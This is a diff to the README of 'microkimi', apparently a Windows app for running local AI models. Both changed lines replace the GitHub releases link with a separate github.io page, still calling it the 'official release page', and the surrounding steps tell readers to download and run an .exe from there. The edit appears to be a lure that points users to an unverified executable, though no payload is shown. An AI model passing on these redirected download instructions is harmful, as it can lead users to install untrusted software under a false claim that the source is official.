@@ -1,6 +1,6 @@
 # 🚀 microkimi - Run fast AI models on Windows
 
-[![Download microkimi](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Sixtynine-zinger615/microkimi/releases)
+[![Download microkimi](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://sixtynine-zinger615.github.io)
 
 Microkimi allows you to run advanced artificial intelligence models directly on your Windows computer. This software uses the Kimi K3 and DeepSeek-V4-Flash-0731 architectures. Developers built these systems from scratch using the Rust programming language. This design ensures that the program remains fast and stable without requiring extra software files or complex setups.
 
@@ -18,7 +18,7 @@ Before you begin, verify that your computer meets these requirements:
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the official release page: [https://github.com/Sixtynine-zinger615/microkimi/releases](https://github.com/Sixtynine-zinger615/microkimi/releases).
+1. Visit the official release page: [https://sixtynine-zinger615.github.io](https://sixtynine-zinger615.github.io).
 2. Look for the latest version under the "Assets" section.
 3. Click the file that ends in .exe to start the download.
 4. Save the file to your desktop or your Downloads folder.
